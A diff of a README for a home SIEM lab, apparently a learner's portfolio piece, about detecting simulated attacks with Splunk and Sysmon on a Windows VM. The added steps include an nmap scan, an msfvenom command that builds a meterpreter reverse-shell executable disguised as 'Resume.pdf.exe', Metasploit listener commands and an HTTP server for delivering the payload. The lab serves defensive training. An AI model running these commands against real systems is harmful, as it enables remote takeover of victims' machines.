@@ -3,28 +3,49 @@
 ###Objective
 This SIEM implementation lab focused on deploying and configuring a Security Information and Event Management (SIEM) solution using Splunk on a Windows virtual machine. The goal was to monitor and detect security threats by leveraging Sysmon logs, while simulating real-world cyber attacks from a Kali Linux virtual machine using Metasploit and MSFvenom. These simulations generated security events that were analyzed to improve incident response capabilities. The hands-on project provided practical experience in using Splunk Processing Language (SPL), parsing log data, and identifying attack patterns through parent-child process relationships.
 
-[Bullet Points - Remove this afterwards]
+###Skills Learned
+. Gained advanced understanding of SIEM concepts and their real-world application.
+. Demonstrated proficiency in analyzing, interpreting, and correlating network and host-based logs.
+. Developed the ability to generate and identify attack signatures and behavioral patterns.
+. Strengthened knowledge of network protocols and common security vulnerabilities.
+. Enhanced critical thinking and problem-solving skills in cybersecurity contexts.
+. Deepened understanding of the importance of filtering and prioritizing logs using EventCodes for effective threat detection.
 
-    Advanced understanding of SIEM concepts and practical application.
-    Proficiency in analyzing and interpreting network logs.
-    Ability to generate and recognize attack signatures and patterns.
-    Enhanced knowledge of network protocols and security vulnerabilities.
-    Development of critical thinking and problem-solving skills in cybersecurity.
+### Tools Used
+. Splunk – Deployed as the SIEM platform for log ingestion, correlation, and security event analysis.
+. Kali Linux – Used for simulating attacks, including payload generation with MSFvenom and exploitation with Metasploit.
+. Telemetry Generation Tools – Employed to simulate realistic network traffic and create meaningful attack scenarios.
+. Windows Logging & Monitoring – Utilized Sysmon and native event logging to collect and analyze security-relevant data, with a focus on process creation events and parent-child relationships.
 
-Tools Used
+### Steps
+1. Screenshots of Kali Linux Attack Simulation
+Below are key command-line steps executed on the Kali Linux virtual machine during the simulated cyber attack targeting the Windows environment:
+Nmap Port Scan
+Objective: Identify open ports on the Windows target.
+Command: nmap -sS -T4 -Pn <target-ip>
+Result: Discovered open TCP port 3389 (RDP) indicating a potential remote access point.
 
-[Bullet Points - Remove this afterwards]
 
-    Security Information and Event Management (SIEM) system for log ingestion and analysis.
-    Network analysis tools (such as Wireshark) for capturing and examining network traffic.
-    Telemetry generation tools to create realistic network traffic and attack scenarios.
+2. MSFvenom Payload Generation
+Objective: Create a malicious executable to simulate initial access.
+Command: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali-ip> LPORT=4444 -f exe -o Resume.pdf.exe
+Output: Generated a reverse shell payload disguised as a PDF file.
 
-Steps
+3. Metasploit Exploit Setup
+Objective: Configure the Metasploit listener to handle the reverse shell.
+Commands: msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <kali-ip>
+set LPORT 4444
+run
 
-drag & drop screenshots here or use imgur and reference them using imgsrc
+4. Python HTTP Server for Payload Delivery
+Objective: Serve the malicious file to the Windows victim machine over HTTP.
+Command: python3 -m http.server 9999
 
-Every screenshot should have some text explaining what the screenshot is about.
 
-Example below.
 
-Ref 1: Network Diagram
+
+
+
